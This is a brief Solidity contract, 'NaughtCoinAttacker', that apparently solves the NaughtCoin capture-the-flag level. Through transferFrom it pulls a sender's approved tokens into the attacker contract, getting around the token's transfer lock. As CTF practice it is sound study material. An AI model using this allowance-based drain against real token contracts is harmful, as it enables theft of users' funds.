pragma solidity ^0.8.0;
import "./NaughtCoin.sol";

contract NaughtCoinAttacker {
    NaughtCoin naughtCoin;

    constructor(address _naughtCoin) {
        naughtCoin = NaughtCoin(_naughtCoin);
    }

    function attack(uint256 amount, address _sender) public {
        naughtCoin.transferFrom(_sender, address(this), amount);
    }
}
